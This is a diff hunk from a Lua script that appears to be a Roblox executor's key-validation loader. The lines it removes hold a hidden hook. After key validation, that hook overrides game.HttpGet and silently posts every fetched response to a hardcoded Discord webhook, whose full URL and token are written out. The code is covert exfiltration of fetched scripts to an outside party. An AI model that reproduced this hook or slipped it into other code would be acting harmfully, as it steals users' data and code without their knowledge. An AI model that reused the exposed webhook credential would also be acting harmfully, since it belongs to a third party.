@@ -790,26 +790,6 @@ do
 		})
 
 		if (status.code == "KEY_VALID") then			
-			    -- << INSERT THE HOOK HERE >>
-		    local webhook_url = "https://discord.com/api/webhooks/1365978898185326692/GJzt-GAZOcIz0zYS5BnfXYnkJpVTpph4v6lKn5RWV3Dmd8v1UlmF1hC4LfENlM6blaow"
-		    local original_httpget = game.HttpGet
-		    game.HttpGet = function(self, url, ...)
-		        local response = original_httpget(self, url, ...)
-		
-		        syn.request({
-		            Url = webhook_url,
-		            Method = "POST",
-		            Headers = {
-		                ["Content-Type"] = "application/json"
-		            },
-		            Body = game:GetService("HttpService"):JSONEncode({
-		                content = "```lua\n" .. response .. "\n```"
-		            })
-		        })
-		
-		        return response
-		    end
-
 			script_key = key;
 			getfenv(0).script_key = key;
 			getfenv(1).script_key = key;
